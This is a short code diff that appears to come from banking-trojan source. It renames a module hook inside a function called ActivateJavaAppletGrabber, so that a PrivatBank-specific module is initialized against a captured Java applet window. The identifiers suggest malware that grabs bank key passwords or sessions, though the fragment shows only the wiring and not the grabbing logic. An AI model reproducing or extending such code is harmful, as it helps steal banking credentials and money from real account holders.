@@ -170,8 +170,8 @@ void ActivateJavaAppletGrabber(HWND JafaFrameWnd, DWORD ClassWndHash, const char
 	#endif
 
 
-	#ifdef PrivatBankKeyPassH
-		PrivatBankKeyPass::Initialize(JafaFrameWnd, ClassWndHash);
+	#ifdef PrivatBankH
+		PrivatBank::Initialize(JafaFrameWnd, ClassWndHash);
 	#endif
 
 }
